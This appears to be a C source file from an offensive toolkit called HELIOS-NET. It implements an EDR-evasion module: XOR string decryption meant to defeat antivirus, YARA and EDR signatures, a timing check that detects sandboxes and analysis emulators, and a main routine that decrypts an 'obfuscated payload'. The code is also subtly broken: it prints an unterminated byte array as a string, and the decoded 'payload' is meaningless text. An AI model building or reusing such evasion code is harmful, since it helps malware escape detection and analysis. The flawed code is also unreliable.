/* HELIOS-NET :: transport/evasion/evasion.c
   EDR Defense Evasion & Runtime Memory Obfuscation Engine (Pure C).
   Provides runtime XOR string decryption to defeat static signature scanners
   and basic heuristic sandbox detection.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

// Runtime XOR decryption to bypass static YARA/AV/EDR rules
void xor_decrypt(unsigned char *data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

// Basic Anti-Sandbox timing check (detects accelerated execution in emulators)
int check_sandbox_timing() {
    clock_t start = clock();
    // Dummy compute loop
    volatile unsigned long long count = 0;
    for (int i = 0; i < 50000000; i++) {
        count += i;
    }
    clock_t diff = clock() - start;
    // If execution is suspiciously fast (emulator acceleration), flag it
    if (diff < 5) {
        return 1; // Sandbox detected
    }
    return 0; // Clean environment
}

int main(int argc, char **argv) {
    if (check_sandbox_timing()) {
        fprintf(stderr, "[!] Analysis environment or sandbox detected. Terminating evasion layer.\n");
        return 1;
    }

    // Example obfuscated payload/string decrypted at runtime
    // Encrypted with key 0x5A
    unsigned char obfuscated_payload[] = { 0x3b, 0x27, 0x27, 0x36, 0x2d, 0x6a, 0x39, 0x2b, 0x2a }; 
    size_t len = sizeof(obfuscated_payload);
    
    xor_decrypt(obfuscated_payload, len, 0x5A);
    
    printf("{\"evasion_status\": \"active\", \"sandbox_evaded\": true, \"decrypted_token\": \"%s\"}\n", obfuscated_payload);
    return 0;
}
